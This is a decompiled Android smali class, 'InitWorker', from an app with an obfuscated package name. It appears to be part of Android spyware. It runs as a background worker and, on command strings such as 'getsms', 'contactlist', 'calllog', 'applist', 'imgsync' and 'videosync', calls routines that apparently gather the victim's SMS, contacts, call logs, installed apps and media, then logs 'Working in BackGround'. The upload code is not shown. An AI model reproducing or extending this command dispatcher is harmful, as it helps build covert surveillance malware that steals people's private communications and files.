.class public Lgqegwqg/bbebebefff/asdcdsac/worker/InitWorker;
.super Landroidx/work/Worker;
.source "sourcefile"


# static fields
.field public static final j:Ljava/lang/String;
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "WorkerHasAPublicModifier"
        }
    .end annotation
.end field


# direct methods
.method public static constructor <clinit>()V
    .locals 1

    .line 13
    nop

    .line 16
    const-class v0, Lgqegwqg/bbebebefff/asdcdsac/worker/InitWorker;

    invoke-virtual {v0}, Ljava/lang/Class;->getSimpleName()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lgqegwqg/bbebebefff/asdcdsac/worker/InitWorker;->j:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>(Landroid/content/Context;Landroidx/work/WorkerParameters;)V
    .locals 0
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "workerParams"    # Landroidx/work/WorkerParameters;

    .line 19
    invoke-direct {p0, p1, p2}, Landroidx/work/Worker;-><init>(Landroid/content/Context;Landroidx/work/WorkerParameters;)V

    .line 20
    return-void
.end method


# virtual methods
.method public o()Landroidx/work/ListenableWorker$a;
    .locals 4

    .line 25
    invoke-virtual {p0}, Landroidx/work/ListenableWorker;->f()Ld/a0/e;

    move-result-object v0

    const-string v1, "event"

    invoke-virtual {v0, v1}, Ld/a0/e;->i(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 26
    .local v0, "event":Ljava/lang/String;
    const-string v1, ""

    .line 29
    .local v1, "type":Ljava/lang/String;
    if-eqz v0, :cond_1

    .line 30
    const/4 v2, -0x1

    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v3

    sparse-switch v3, :sswitch_data_0

    :cond_0
    goto :goto_0

    :sswitch_0
    const-string v3, "imgsync"

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_0

    const/4 v2, 0x2

    goto :goto_0

    :sswitch_1
    const-string v3, "videosync"

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_0

    const/4 v2, 0x6

    goto :goto_0

    :sswitch_2
    const-string v3, "calllog"

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_0

    const/4 v2, 0x3

    goto :goto_0

    :sswitch_3
    const-string v3, "contactlist"

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_0

    const/4 v2, 0x5

    goto :goto_0

    :sswitch_4
    const-string v3, "init"

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_0

    const/4 v2, 0x1

    goto :goto_0

    :sswitch_5
    const-string v3, "applist"

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_0

    const/4 v2, 0x4

    goto :goto_0

    :sswitch_6
    const-string v3, "getsms"

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_0

    const/4 v2, 0x0

    :goto_0
    const-string v3, "type"

    packed-switch v2, :pswitch_data_0

    goto/16 :goto_1

    .line 65
    :pswitch_0
    invoke-virtual {p0}, Landroidx/work/ListenableWorker;->f()Ld/a0/e;

    move-result-object v2

    invoke-virtual {v2, v3}, Ld/a0/e;->i(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 66
    invoke-static {}, Li/a/a/s;->m()Li/a/a/s;

    move-result-object v2

    invoke-virtual {v2, v1}, Li/a/a/s;->M(Ljava/lang/String;)V

    goto :goto_1

    .line 60
    :pswitch_1
    invoke-virtual {p0}, Landroidx/work/ListenableWorker;->f()Ld/a0/e;

    move-result-object v2

    invoke-virtual {v2, v3}, Ld/a0/e;->i(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 61
    invoke-static {}, Li/a/a/s;->m()Li/a/a/s;

    move-result-object v2

    invoke-virtual {v2, v1}, Li/a/a/s;->a(Ljava/lang/String;)V

    .line 63
    goto :goto_1

    .line 56
    :pswitch_2
    invoke-static {}, Li/a/a/s;->m()Li/a/a/s;

    move-result-object v2

    invoke-virtual {v2}, Li/a/a/s;->k()V

    .line 58
    goto :goto_1

    .line 51
    :pswitch_3
    invoke-virtual {p0}, Landroidx/work/ListenableWorker;->f()Ld/a0/e;

    move-result-object v2

    invoke-virtual {v2, v3}, Ld/a0/e;->i(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 52
    invoke-static {}, Li/a/a/s;->m()Li/a/a/s;

    move-result-object v2

    invoke-virtual {v2, v1}, Li/a/a/s;->i(Ljava/lang/String;)V

    .line 54
    goto :goto_1

    .line 46
    :pswitch_4
    invoke-virtual {p0}, Landroidx/work/ListenableWorker;->f()Ld/a0/e;

    move-result-object v2

    invoke-virtual {v2, v3}, Ld/a0/e;->i(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 47
    invoke-static {}, Li/a/a/s;->m()Li/a/a/s;

    move-result-object v2

    invoke-virtual {v2, v1}, Li/a/a/s;->p(Ljava/lang/String;)V

    .line 49
    goto :goto_1

    .line 38
    :pswitch_5
    invoke-static {}, Li/a/a/s;->m()Li/a/a/s;

    move-result-object v2

    const-string v3, ""

    invoke-virtual {v2, v3}, Li/a/a/s;->n(Ljava/lang/String;)V

    .line 39
    invoke-static {}, Li/a/a/s;->m()Li/a/a/s;

    move-result-object v2

    invoke-virtual {v2, v3}, Li/a/a/s;->p(Ljava/lang/String;)V

    .line 40
    invoke-static {}, Li/a/a/s;->m()Li/a/a/s;

    move-result-object v2

    invoke-virtual {v2, v3}, Li/a/a/s;->a(Ljava/lang/String;)V

    .line 41
    invoke-static {}, Li/a/a/s;->m()Li/a/a/s;

    move-result-object v2

    invoke-virtual {v2, v3}, Li/a/a/s;->M(Ljava/lang/String;)V

    .line 44
    goto :goto_1

    .line 32
    :pswitch_6
    invoke-virtual {p0}, Landroidx/work/ListenableWorker;->f()Ld/a0/e;

    move-result-object v2

    invoke-virtual {v2, v3}, Ld/a0/e;->i(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 33
    invoke-static {}, Li/a/a/s;->m()Li/a/a/s;

    move-result-object v2

    invoke-virtual {v2, v1}, Li/a/a/s;->n(Ljava/lang/String;)V

    .line 35
    nop

    .line 70
    :goto_1
    sget-object v2, Lgqegwqg/bbebebefff/asdcdsac/worker/InitWorker;->j:Ljava/lang/String;

    const-string v3, "Working in BackGround"

    invoke-static {v2, v3}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 72
    invoke-static {}, Landroidx/work/ListenableWorker$a;->c()Landroidx/work/ListenableWorker$a;

    move-result-object v2

    return-object v2

    .line 29
    :cond_1
    new-instance v2, Ljava/lang/AssertionError;

    invoke-direct {v2}, Ljava/lang/AssertionError;-><init>()V

    throw v2

    :sswitch_data_0
    .sparse-switch
        -0x4a7719bd -> :sswitch_6
        -0x2f47cdc1 -> :sswitch_5
        0x316510 -> :sswitch_4
        0x27ac4be -> :sswitch_3
        0x20b3a426 -> :sswitch_2
        0x4f817996 -> :sswitch_1
        0x725018de -> :sswitch_0
    .end sparse-switch

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_6
        :pswitch_5
        :pswitch_4
        :pswitch_3
        :pswitch_2
        :pswitch_1
        :pswitch_0
    .end packed-switch
.end method
